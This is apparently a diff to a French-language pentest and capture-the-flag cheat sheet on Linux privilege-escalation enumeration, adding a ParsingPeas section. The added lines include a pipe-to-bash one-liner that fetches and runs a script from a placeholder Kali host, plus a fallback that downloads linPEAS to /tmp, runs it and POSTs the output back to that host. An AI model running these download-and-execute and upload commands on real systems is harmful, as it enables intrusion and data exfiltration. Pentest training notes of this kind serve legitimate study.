@@ -2,12 +2,6 @@
 
 ## Commandes utiles
 
-**Trouver un flag**
-
-```bash
-find / -name "flag.txt" 2>/dev/null
-```
-
 **Exécuter un script Bash**
 
 ```bash
@@ -120,8 +114,47 @@ lsmod
 /sbin/modinfo <module>
 ```
 ### Enumération automatique
+#### ParsingPeas
 
-**linPEAS**
+[https://github.com/YuvalMil/ParsingPeas](https://github.com/YuvalMil/ParsingPeas)
+
+**On Kali Host**
+
+```shell
+git clone https://github.com/YuvalMil/ParsingPeas.git
+cd ParsingPeas
+./setup.sh              # Downloads LinPEAS/WinPEAS
+pip3 install -r requirements.txt
+python3 receiver.py     # Starts on http://0.0.0.0:8000
+```
+
+**On Target Machine**
+
+```shell
+curl -sSL http://YOUR_KALI_IP:8000/get-script | bash
+```
+Navigate to `http://YOUR_KALI_IP:8000` in your browser to view reports.
+
+If the one-liner fails:
+
+```shell
+# On target
+curl http://KALI_IP:8000/get-linpeas -o /tmp/lp.sh
+chmod +x /tmp/lp.sh
+/tmp/lp.sh > /tmp/out.txt
+
+# Transfer
+curl -X POST -H "X-Hostname: $(hostname)" -H "X-Scan-Type: linpeas" \
+  --data-binary @/tmp/out.txt http://KALI_IP:8000/upload
+```
+
+**Parse local files:**
+
+```shell
+python3 parser.py /path/to/peas_output.txt
+```
+
+#### linPEAS
 
 https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
 
@@ -139,7 +172,7 @@ wget http://<ip>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
 ./linpeas.sh > output.txt
 ```
 
-**unix-privesc-check**
+#### unix-privesc-check
 
 Pré-installé sur Kali dans `/usr/bin/unix-privesc-check`. Transférer sur la cible et rediriger l'output dans un fichier.
 
